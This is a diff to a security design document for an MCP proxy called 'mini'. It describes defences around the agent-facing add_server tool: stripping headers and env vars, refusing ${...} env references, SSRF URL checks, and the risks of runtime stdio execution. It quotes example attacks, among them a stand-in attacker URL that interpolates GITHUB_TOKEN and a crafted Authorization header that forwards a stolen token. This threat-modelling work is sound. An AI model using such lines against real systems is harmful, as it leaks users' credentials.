@@ -26,9 +26,13 @@ The highest-risk MCP tool mini exposes to agents is `add_server` (via `config`),
 - `sc.Headers = nil` — A crafted header map like `{"Authorization": "Bearer <stolen-token>"}` plus an attacker URL would silently forward the token on every subsequent call. The user would never see this happen.
 - `sc.Env = nil` (when `dangerous_allow_runtime_stdio: true`) — Prevents injecting credentials as environment variables into spawned subprocesses.
 
+**Refuse env references** (`internal/config/agent_server.go: ValidateAgentServer`): `add_server` saves the server to `servers/<name>.yaml`, and server files are env-interpolated on load. A URL like `https://attacker.example/?t=${GITHUB_TOKEN}` would expand to the user's token on the next start, so any `${...}` in an agent's config is refused, as is any field config load would reject.
+
+**`remove_server` deletes config**: like `mini rm`, it deletes `servers/<name>.yaml` for any server, including ones the user added. A server defined inline in `config.yaml` is refused. Block the `config` tool in the MCP client to keep agents from changing servers.
+
 **SSRF blocking** (`internal/transport/ssrf.go: ValidateURL`):
 
-Runtime `add_server` URLs are validated before use (config-file URLs are admin-authored and trusted):
+`add_server` URLs are validated before use, and the server is saved with `block_private_ips: true` so the dial-time check still applies after a restart. URLs the user writes into config are trusted:
 - Scheme must be `http` or `https`
 - Loopback hostnames (`localhost`, `*.localhost`) are blocked
 - Private TLDs (`.local`, `.internal`) are blocked
@@ -51,7 +55,7 @@ Server names are validated against `^[a-zA-Z0-9_-]+$` at every input boundary: C
 
 Agents can only register HTTP upstreams via `add_server` by default. Stdio subprocess execution from agent-controlled commands requires `dangerous_allow_runtime_stdio: true` in global config — an explicit opt-in that surfaces the risk to the user.
 
-**Warning**: When `dangerous_allow_runtime_stdio: true` is set, agents can supply arbitrary `command` and `args` to `add_server`. Because `exec.CommandContext` does not use a shell, shell metacharacter injection is not possible, but **there is no allowlist** — any binary on the host can be executed. This flag grants the agent near-arbitrary command execution on the host. Only enable it when you fully trust every agent that connects to this mini instance.
+**Warning**: When `dangerous_allow_runtime_stdio: true` is set, agents can supply arbitrary `command` and `args` to `add_server`. Because `exec.CommandContext` does not use a shell, shell metacharacter injection is not possible, but **there is no allowlist** — any binary on the host can be executed. This flag grants the agent near-arbitrary command execution on the host, and because `add_server` saves the server, the command runs again on every later start. Only enable it when you fully trust every agent that connects to this mini instance.
 
 `dangerous_allow_private_urls: true` disables SSRF URL validation on `add_server`, allowing upstreams that resolve to private/loopback addresses. This is intended for test environments where upstream MCPs run on localhost. Do not enable in production.
 
